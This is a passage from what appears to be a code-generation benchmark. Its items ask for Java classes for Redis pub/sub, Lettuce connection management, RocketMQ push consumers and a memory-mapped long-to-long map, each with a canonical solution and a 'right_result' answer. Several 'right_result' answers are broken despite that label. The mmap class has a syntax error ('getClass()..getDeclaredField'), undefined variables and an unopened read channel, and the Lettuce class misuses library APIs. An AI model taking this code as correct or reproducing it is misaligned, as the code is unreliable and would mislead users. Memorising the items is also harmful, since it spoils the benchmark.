(!newMaster.equals(currentMaster)) {\n                        initMaster(newMaster);\n                    }\n                } catch (InterruptedException e) {\n                    break;\n                }\n            }\n        }\n\n        public void shutdown() {\n            running.set(false);\n            interrupt();\n        }\n    }\n\n    public void shutdown() {\n        if (sentinelListener != null) {\n            sentinelListener.shutdown();\n        }\n        if (pool != null) {\n            pool.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 357,
    "Instruction": "Task Description: Implement a Redis-based broadcast service for inter-process communication that allows sending and receiving messages between different instances of an application.\n\nClass Description: RedisBroadcastService is a class that provides publish-subscribe functionality using Redis as the message broker. It handles message serialization/deserialization and ensures messages are only processed by other instances (not the sender).\n\nAttributes:\n- objectMapper: ObjectMapper - Used for JSON serialization/deserialization of messages\n- executorService: ExecutorService - Handles message reception in a separate thread\n- channel: String - The Redis channel name for pub/sub communication\n- subscriber: Jedis - Redis client for subscribing to messages\n- publisher: Jedis - Redis client for publishing messages\n- id: String - Unique identifier for this service instance to avoid processing own messages\n\nMethods:\n- RedisBroadcastService(Config config, ExecutorService executorService, ObjectMapper objectMapper) -> void - Constructor that initializes Redis connections\n- sendMessage(BroadcastMessage message) -> void - Publishes a message to the Redis channel\n- start() -> void - Starts the message receiver in a separate thread\n- stop() -> void - Closes Redis connections and cleans up resources\n- receiver: Runnable - Internal thread that handles incoming messages from Redis",
    "Canonical_solution": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\n\nimport java.io.IOException;\nimport java.util.UUID;\nimport java.util.concurrent.ExecutorService;\n\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPubSub;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\n\npublic class RedisBroadcastService extends BaseBroadcastService {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(RedisBroadcastService.class);\n\n    private final ObjectMapper objectMapper;\n    private final ExecutorService executorService;\n    private final String channel = \"traccar\";\n    private Jedis subscriber;\n    private Jedis publisher;\n    private final String id = UUID.randomUUID().toString();\n\n    public RedisBroadcastService(\n            Config config, ExecutorService executorService, ObjectMapper objectMapper) throws IOException {\n        this.executorService = executorService;\n        this.objectMapper = objectMapper;\n        String url = config.getString(Keys.BROADCAST_ADDRESS);\n\n        try {\n            subscriber = new Jedis(url);\n            publisher = new Jedis(url);\n            subscriber.connect();\n        } catch (JedisConnectionException e) {\n            throw new IOException(e);\n        }\n    }\n\n    @Override\n    protected void sendMessage(BroadcastMessage message) {\n        try {\n            String payload = id  + \":\" + objectMapper.writeValueAsString(message);\n            publisher.publish(channel, payload);\n        } catch (IOException | JedisConnectionException e) {\n            LOGGER.warn(\"Broadcast failed\", e);\n        }\n    }\n\n    @Override\n    public void start() throws IOException {\n        executorService.submit(receiver);\n    }\n\n    @Override\n    public void stop() {\n        try {\n            if (subscriber != null) {\n                subscriber.close();\n                subscriber = null;\n            }\n        } catch (JedisException e) {\n            LOGGER.warn(\"Subscriber close failed\", e);\n        }\n        try {\n            if (publisher != null) {\n                publisher.close();\n                publisher = null;\n            }\n        } catch (JedisException e) {\n            LOGGER.warn(\"Publisher close failed\", e);\n        }\n    }\n\n    private final Runnable receiver = new Runnable() {\n        @Override\n        public void run() {\n            try {\n                subscriber.subscribe(new JedisPubSub() {\n                    @Override\n                    public void onMessage(String messageChannel, String message) {\n                        try {\n                            String[] parts = message.split(\":\", 2);\n                            if (messageChannel.equals(channel) && parts.length == 2 && !id.equals(parts[0])) {\n                                handleMessage(objectMapper.readValue(parts[1], BroadcastMessage.class));\n                            }\n                        } catch (Exception e) {\n                            LOGGER.warn(\"Broadcast handleMessage failed\", e);\n                        }\n                    }\n                }, channel);\n            } catch (JedisException e) {\n                throw new RuntimeException(e);\n            }\n        }\n    };\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPubSub;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\nimport java.util.concurrent.ExecutorService;\n\npublic class RedisBroadcastService {\n    private final ObjectMapper objectMapper;\n    private final ExecutorService executorService;\n    private final String channel;\n    private final Jedis subscriber;\n    private final Jedis publisher;\n    private final String id;\n\n    public RedisBroadcastService(Config config, ExecutorService executorService, ObjectMapper objectMapper) {\n        this.objectMapper = objectMapper;\n        this.executorService = executorService;\n        this.channel = config.getChannel();\n        this.subscriber = new Jedis(config.getHost(), config.getPort());\n        this.publisher = new Jedis(config.getHost(), config.getPort());\n        this.id = generateInstanceId();\n    }\n\n    public void sendMessage(BroadcastMessage message) throws Exception {\n        message.setSenderId(id);\n        String jsonMessage = objectMapper.writeValueAsString(message);\n        publisher.publish(channel, jsonMessage);\n    }\n\n    public void start() {\n        executorService.submit(new Receiver());\n    }\n\n    public void stop() {\n        subscriber.close();\n        publisher.close();\n    }\n\n    private class Receiver implements Runnable {\n        @Override\n        public void run() {\n            JedisPubSub jedisPubSub = new JedisPubSub() {\n                @Override\n                public void onMessage(String channel, String message) {\n                    try {\n                        BroadcastMessage receivedMessage = objectMapper.readValue(message, BroadcastMessage.class);\n                        if (!receivedMessage.getSenderId().equals(id)) {\n                            handleIncomingMessage(receivedMessage);\n                        }\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n            };\n            subscriber.subscribe(jedisPubSub, channel);\n        }\n    }\n\n    private void handleIncomingMessage(BroadcastMessage message) {\n        // Implement custom logic for handling incoming messages\n    }\n\n    private String generateInstanceId() {\n        return \"instance-\" + System.currentTimeMillis();\n    }\n}\n```"
  },
  {
    "Task_id": 358,
    "Instruction": "Task Description: Create a Redis connection manager class that handles both standalone and cluster Redis connections with authentication support, including connection initialization, creation of different connection types, and proper resource cleanup.\n\nClass Description: The RedisConnectionManager class provides centralized management for Redis connections, supporting both standalone and cluster configurations with token-based authentication. It handles connection lifecycle management and provides methods to create different types of Redis connections.\n\nAttributes:\n\nclientOptions: [ClusterClientOptions] - Configuration options for Redis client connections\ncredentialsProvider: [TokenBasedRedisCredentialsProvider] - Provider for token-based authentication credentials\nclient: [RedisClient] - Client instance for standalone Redis connections\nclusterClient: [RedisClusterClient] - Client instance for Redis cluster connections\n\nMethods:\n\ninitializeConnection: [Name]([EntraIdTestContext testCtx]) -> [void] - Initializes Redis client instances with connection options and authentication configuration\ncreateStandaloneConnection: [Name]() -> [StatefulRedisConnection<String, String>] - Creates and returns a new standalone Redis connection\ncreateClusterConnection: [Name]() -> [StatefulRedisClusterConnection<String, String>] - Creates and returns a new Redis cluster connection\ncreatePubSubConnection: [Name]() -> [StatefulRedisPubSubConnection<String, String>] - Creates and returns a new Redis Pub/Sub connection\ncloseConnections: [Name]() -> [void] - Closes all active connections and releases resources",
    "Canonical_solution": "import io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.SocketOptions;\nimport io.lettuce.core.TimeoutOptions;\nimport io.lettuce.core.cluster.ClusterClientOptions;\nimport io.lettuce.core.cluster.RedisClusterClient;\nimport redis.clients.authentication.core.TokenAuthConfig;\nimport redis.clients.authentication.entraid.EntraIDTokenAuthConfigBuilder;\nimport redis.clients.authentication.core.TokenBasedRedisCredentialsProvider;\n\npublic class RedisConnectionManager {\n\n    private ClusterClientOptions clientOptions;\n    private TokenBasedRedisCredentialsProvider credentialsProvider;\n    private RedisClient client;\n    private RedisClusterClient clusterClient;\n\n    public void initializeConnection(EntraIdTestContext testCtx) {\n        clientOptions = ClusterClientOptions.builder()\n                .socketOptions(SocketOptions.builder().connectTimeout(Duration.ofSeconds(1)).build())\n                .timeoutOptions(TimeoutOptions.enabled(Duration.ofSeconds(1)))\n                .reauthenticateBehavior(ClientOptions.ReauthenticateBehavior.ON_NEW_CREDENTIALS).build();\n\n        TokenAuthConfig tokenAuthConfig = EntraIDTokenAuthConfigBuilder.builder().clientId(testCtx.getClientId())\n                .secret(testCtx.getClientSecret()).authority(testCtx.getAuthority()).scopes(testCtx.getRedisScopes())\n                .expirationRefreshRatio(0.0000001F).build();\n\n        credentialsProvider = TokenBasedRedisCredentialsProvider.create(tokenAuthConfig);\n\n        RedisURI uri = RedisURI.builder().withHost(testCtx.host()).withPort(testCtx.port())\n                .withAuthentication(credentialsProvider).build();\n\n        client = RedisClient.create(uri);\n        client.setOptions(clientOptions);\n\n        RedisURI clusterUri = RedisURI.builder().withHost(testCtx.clusterHost().get(0)).withPort(testCtx.clusterPort())\n                .withAuthentication(credentialsProvider).build();\n        clusterClient = RedisClusterClient.create(clusterUri);\n        clusterClient.setOptions(clientOptions);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return client.connect();\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        return clusterClient.connect();\n    }\n\n    public StatefulRedisPubSubConnection<String, String> createPubSubConnection() {\n        return client.connectPubSub();\n    }\n\n    public void closeConnections() {\n        if (credentialsProvider != null) {\n            credentialsProvider.close();\n        }\n        if (client != null) {\n            client.close();\n        }\n        if (clusterClient != null) {\n            clusterClient.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.*;\nimport io.lettuce.core.cluster.RedisClusterClient;\nimport io.lettuce.core.cluster.api.StatefulRedisClusterConnection;\nimport io.lettuce.core.pubsub.StatefulRedisPubSubConnection;\nimport io.lettuce.core.resource.ClientResources;\nimport io.lettuce.core.support.ConnectionPoolSupport;\nimport io.lettuce.core.support.CredentialsProvider;\n\npublic class RedisConnectionManager {\n\n    private ClusterClientOptions clientOptions;\n    private CredentialsProvider credentialsProvider;\n    private RedisClient client;\n    private RedisClusterClient clusterClient;\n    private ClientResources clientResources;\n\n    public void initializeConnection(EntraIdTestContext testCtx) {\n        clientResources = ClientResources.builder().build();\n        clientOptions = ClusterClientOptions.builder()\n                .autoReconnect(true)\n                .disconnectedBehavior(ClientOptions.DisconnectedBehavior.RECONNECT_AND_RESUBSCRIBE)\n                .build();\n\n        String host = testCtx.getHost();\n        int port = testCtx.getPort();\n        String token = testCtx.getToken();\n\n        credentialsProvider = new TokenBasedRedisCredentialsProvider(token);\n\n        client = RedisClient.create(clientResources, \"redis://\" + host + \":\" + port);\n        client.setOptions(clientOptions);\n\n        clusterClient = RedisClusterClient.create(clientResources, \"redis://\" + host + \":\" + port);\n        clusterClient.setOptions(clientOptions);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return client.connect(new StringCodec());\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        return clusterClient.connect(new StringCodec());\n    }\n\n    public StatefulRedisPubSubConnection<String, String> createPubSubConnection() {\n        return client.connectPubSub(new StringCodec());\n    }\n\n    public void closeConnections() {\n        if (client != null) {\n            client.shutdown();\n        }\n        if (clusterClient != null) {\n            clusterClient.shutdown();\n        }\n        if (clientResources != null) {\n            clientResources.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 359,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer to subscribe to messages from a specified topic and process them asynchronously.\n\nClass Description: The SimpleConsumer class provides a basic implementation of a RocketMQ push consumer. It handles the setup, subscription, message listening, and lifecycle management of a consumer instance. The class allows for easy configuration of consumer group, NameServer address, topic subscription, and message processing logic.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The core RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- SimpleConsumer(String consumerGroup, String namesrvAddr) -> void - Constructor that initializes the consumer with a consumer group and NameServer address\n- subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a message listener to handle incoming messages\n- start() -> void - Starts the consumer to begin message consumption\n- shutdown() -> void - Shuts down the consumer gracefully\n- createDefaultListener() -> MessageListenerConcurrently - Static factory method that creates a default message listener which prints received messages",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport java.util.List;\n\npublic class SimpleConsumer {\n    private DefaultMQPushConsumer consumer;\n\n    public SimpleConsumer(String consumerGroup, String namesrvAddr) {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static MessageListenerConcurrently createDefaultListener() {\n        return new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                for (MessageExt msg : msgs) {\n                    System.out.println(msg.getKeys() + \":\" + new String(msg.getBody()));\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.MessageSelector;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\n\npublic class SimpleConsumer {\n    private final DefaultMQPushConsumer consumer;\n\n    public SimpleConsumer(String consumerGroup, String namesrvAddr) throws Exception {\n        this.consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) throws Exception {\n        consumer.subscribe(topic, MessageSelector.bySql(subExpression));\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws Exception {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static MessageListenerConcurrently createDefaultListener() {\n        return (List<MessageExt> msgs, ConsumeConcurrentlyContext context) -> {\n            for (MessageExt msg : msgs) {\n                System.out.printf(\"Received message: %s%n\", new String(msg.getBody()));\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        };\n    }\n}\n```"
  },
  {
    "Task_id": 36,
    "Instruction": "Task Description: Implement a memory-mapped file-based key-value store for long-to-long mappings using Java NIO's FileChannel and MappedByteBuffer.\n\nClass Description: ArrayLongLongMapMmap provides a memory-efficient way to store and retrieve long-to-long mappings using memory-mapped files. It segments large files into manageable chunks for efficient random access.\n\nAttributes:\n- path: Path - The filesystem path where the memory-mapped file will be stored\n- writeChannel: FileChannel - Channel for writing to the file during initialization\n- segmentsArray: MappedByteBuffer[] - Array of memory-mapped buffers for reading data\n- readChannel: FileChannel - Channel for reading from the file after initialization\n\nMethods:\n- ArrayLongLongMapMmap(Path path, boolean madvise) - Constructor - Initializes the map with the given file path\n- init() -> void - Initializes the memory mapping by closing the write channel and opening read channels with segmented mappings\n- get(long key) -> long - Retrieves the value associated with the given key from memory-mapped segments\n- close() -> void - Cleans up resources including unmapping buffers and closing channels, then deletes the file\n\nThe implementation uses memory-mapped files (1<<27 byte segments) for efficient random access to large datasets while minimizing memory usage. The close() method ensures proper resource cleanup including buffer unmapping and file deletion.",
    "Canonical_solution": "import com.onthegomap.planetiler.util.ByteBufferUtil;\nimport com.onthegomap.planetiler.util.FileUtils;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.Semaphore;\n\nclass ArrayLongLongMapMmap {\n\n  private final Path path;\n  private FileChannel writeChannel;\n  private MappedByteBuffer[] segmentsArray;\n  private FileChannel readChannel = null;\n\n  ArrayLongLongMapMmap(Path path, boolean madvise) {\n    this.path = path;\n    try {\n      writeChannel = FileChannel.open(path, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n    } catch (IOException e) {\n      throw new UncheckedIOException(e);\n    }\n  }\n\n  public void init() {\n    try {\n      writeChannel.close();\n      readChannel = FileChannel.open(path, StandardOpenOption.READ);\n      segmentsArray = ByteBufferUtil.mapFile(readChannel, readChannel.size(), 1L << 27, false, null);\n    } catch (IOException e) {\n      throw new UncheckedIOException(e);\n    }\n  }\n\n  @Override\n  public long get(long key) {\n    long byteOffset = key << 3;\n    int idx = (int) (byteOffset >>> 27);\n    if (idx >= segmentsArray.length) {\n      return 0;\n    }\n    MappedByteBuffer mappedByteBuffer = segmentsArray[idx];\n    if (mappedByteBuffer == null) {\n      return 0;\n    }\n    int offset = (int) (byteOffset & ((1L << 27) - 1));\n    return mappedByteBuffer.getLong(offset);\n  }\n\n  @Override\n  public void close() throws IOException {\n    if (segmentsArray != null) {\n      ByteBufferUtil.free(segmentsArray);\n      segmentsArray = null;\n    }\n    if (writeChannel != null) {\n      writeChannel.close();\n      writeChannel = null;\n    }\n    if (readChannel != null) {\n      readChannel.close();\n      readChannel = null;\n    }\n    FileUtils.delete(path);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.lang.reflect.Field;\nimport sun.misc.Unsafe;\n\npublic class ArrayLongLongMapMmap {\n    private final Path path;\n    private FileChannel writeChannel;\n    private MappedByteBuffer[] segmentsArray;\n    private FileChannel readChannel;\n    private static final int SEGMENT_SIZE = 1 << 27; // 134,217,728 bytes\n    private static final Unsafe unsafe = getUnsafe();\n\n    public ArrayLongLongMapMmap(Path path, boolean madvise) {\n        this.path = path;\n        try {\n            Files.createDirectories(path.getParent());\n            this.writeChannel = FileChannel.open(path, java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.WRITE);\n            init();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    private void init() throws IOException {\n        long fileSize = writeChannel.size();\n        int segmentCount = (int) ((fileSize + SEGMENT_SIZE - 1) / SEGMENT_SIZE);\n        segmentsArray = new MappedByteBuffer[segmentCount];\n        for (int i = 0; i < segmentCount; i++) {\n            long position = (long) i * SEGMENT_SIZE;\n            segmentsArray[i] = readChannel.map(FileChannel.MapMode.READ_ONLY, position, Math.min(SEGMENT_SIZE, fileSize - position));\n        }\n    }\n\n    public long get(long key) {\n        int segmentIndex = (int) (key >>> 3);\n        int offsetInSegment = (int) (key & 0x7);\n        MappedByteBuffer buffer = segmentsArray[segmentIndex];\n        return buffer.getLong(offsetInSegment * 8);\n    }\n\n    public void close() throws IOException {\n        if (segmentsArray != null) {\n            for (MappedByteBuffer buffer : segmentsArray) {\n                unmap(buffer);\n            }\n        }\n        if (writeChannel != null) {\n            writeChannel.close();\n        }\n        if (readChannel != null) {\n            readChannel.close();\n        }\n        Files.delete(path);\n    }\n\n    private static void unmap(MappedByteBuffer buffer) {\n        try {\n            Field fcField = buffer.getClass()..getDeclaredField(\"fc\");\n            fcField.setAccessible(true);\n            Object fileChannel = fcField.get(buffer);\n            MethodImpl.unmap(fileChannel);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    private static class MethodImpl {\n        private static void unmap(Object fileChannel) throws Exception {\n            Field addressField = bufferAddress.getClass().getDeclaredField(\"address\");\n            addressField.setAccessible(true);\n            long address = (long) addressField.getLong(buffer);\n            unsafe.invokeCleaner(buffer);\n        }\n    }\n\n    private static Unsafe getUnsafe() {\n        try {\n            Field field = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            field.setAccessible(true);\n            return (Unsafe) field.get(null);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 360,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ message consumer using the push model. The class should handle message consumption from a specified topic, with configurable NameServer address and consumer group settings.\n\nClass Description: The Consumer class is a RocketMQ message consumer implementation that subscribes to a topic and processes incoming messages asynchronously. It uses DefaultMQPushConsumer for push-based consumption and provides methods to start, shutdown, and configure the consumer.\n\nAttributes:\n- CONSUMER_GROUP: [String] - The consumer group name for this consumer instance\n- DEFAULT_NAMESRVADDR: [String] - Default NameServer address if none is provided\n- TOPIC: [String] - The topic to subscribe to for messages\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- Consumer() - [Constructor] -> [void] - Initializes the consumer with default settings, subscribes to the topic, and registers a message listener\n- start() -> [void] - Starts the consumer to begin receiving messages\n- shutdown() -> [void] - Shuts down the consumer gracefully\n- setNamesrvAddr(String namesrvAddr) -> [void] - Sets the NameServer address for the consumer",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\n\npublic class Consumer {\n\n    public static final String CONSUMER_GROUP = \"please_rename_unique_group_name_4\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"TopicTest\";\n\n    private DefaultMQPushConsumer consumer;\n\n    public Consumer() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.subscribe(TOPIC, \"*\");\n        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -> {\n            System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msg);\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        System.out.printf(\"Consumer Started.%n\");\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\n\npublic class Consumer {\n    private static final String CONSUMER_GROUP = \"example-consumer-group\";\n    private static final String DEFAULT_NAMESRVADDR = \"localhost:9876\";\n    private static final String TOPIC = \"example-topic\";\n    private DefaultMQPushConsumer consumer;\n\n    public Consumer() {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        try {\n            consumer.subscribe(TOPIC, \"*\");\n            consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n                for (MessageExt msg : msgs) {\n                    System.out.printf(\"Received message: %s%n\", new String(msg.getBody()));\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        try {\n            consumer.start();\n            System.out.println(\"Consumer started.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n        System.out.println(\"Consumer shut down.\");\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n}\n```"
  },
  {
    "Task_id": 361,
    "Instruction": "Task Description: Implement a RocketMQ push consumer in Java that subscribes to a specific topic, processes incoming messages asynchronously, and manages consumer lifecycle operations.\n\nClass Description: LMQPushConsumer is a Java class that encapsulates the functionality of a RocketMQ push consumer. It handles the initialization, startup, and shutdown of the consumer, as well as message consumption from a specified topic using a concurrent message listener.\n\nAttributes:\n- CLUSTER_NAME: [String] - The name of the RocketMQ cluster\n- BROKER_NAME: [String] - The name of the broker\n- TOPIC: [String] - The parent topic name\n- LMQ_TOPIC: [String] - The specific LMQ topic to subscribe to\n- CONSUMER_GROUP: [String] - The consumer group identifier\n- NAMESRV_ADDR: [String] - The NameServer address\n- BROKER_ADDR_MAP: [HashMap<Long, String>] - Mapping of broker IDs to their addresses\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- initialize(): [void] - Initializes the consumer with configuration settings, subscription, and message listener\n  - Input: None\n  - Output: None\n  - Throws: MQClientException if initialization fails\n- start(): [void] - Starts the consumer and updates topic route information\n  - Input: None\n  - Output: None\n  - Throws: MQClientException if startup fails\n- shutdown(): [void] - Shuts down the consumer gracefully\n  - Input: None\n  - Output: None",
    "Canonical_solution": "import com.google.common.collect.Lists;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.List;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.remoting.protocol.route.BrokerData;\nimport org.apache.rocketmq.remoting.protocol.route.TopicRouteData;\n\npublic class LMQPushConsumer {\n    public static final String CLUSTER_NAME = \"DefaultCluster\";\n    public static final String BROKER_NAME = \"broker-a\";\n    public static final String TOPIC = \"TopicLMQParent\";\n    public static final String LMQ_TOPIC = MixAll.LMQ_PREFIX + \"123\";\n    public static final String CONSUMER_GROUP = \"CID_LMQ_1\";\n    public static final String NAMESRV_ADDR = \"127.0.0.1:9876\";\n    public static final HashMap<Long, String> BROKER_ADDR_MAP = new HashMap<Long, String>() {\n        {\n            put(MixAll.MASTER_ID, \"127.0.0.1:10911\");\n        }\n    };\n\n    private DefaultMQPushConsumer consumer;\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(NAMESRV_ADDR);\n        consumer.subscribe(LMQ_TOPIC, \"*\");\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msgs);\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().updateTopicRouteInfoFromNameServer(TOPIC);\n\n        final TopicRouteData topicRouteData = new TopicRouteData();\n        final BrokerData brokerData = new BrokerData();\n        brokerData.setCluster(CLUSTER_NAME);\n        brokerData.setBrokerName(BROKER_NAME);\n        brokerData.setBrokerAddrs(BROKER_ADDR_MAP);\n        topicRouteData.setBrokerDatas(Lists.newArrayList(brokerData));\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().getTopicRouteTable().put(LMQ_TOPIC, topicRouteData);\n        consumer.getDefaultMQPushConsumerImpl().updateTopicSubscribeInfo(LMQ_TOPIC,\n            new HashSet<>(Arrays.asList(new MessageQueue(LMQ_TOPIC, BROKER_NAME, (int) MixAll.LMQ_QUEUE_ID))));\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().doRebalance();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport java.util.HashMap;\n\npublic class LMQPushConsumer {\n    private static final String CLUSTER_NAME = \"DefaultCluster\";\n    private static final String BROKER_NAME = \"BrokerA\";\n    private static final String TOPIC = \"ParentTopic\";\n    private static final String LMQ_TOPIC = TOPIC + \":LMQSubTopic\";\n    private static final String CONSUMER_GROUP = \"LMQConsumerGroup\";\n    private static final String NAMESRV_ADDR = \"localhost:9876\";\n    private static final HashMap<Long, String> BROKER_ADDR_MAP = new HashMap<>();\n    private DefaultMQPushConsumer consumer;\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(NAMESRV_ADDR);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n\n        consumer.subscribe(LMQ_TOPIC, \"*\");\n\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                System.out.println(\"Received message: \" + new String(msg.getBody()));\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        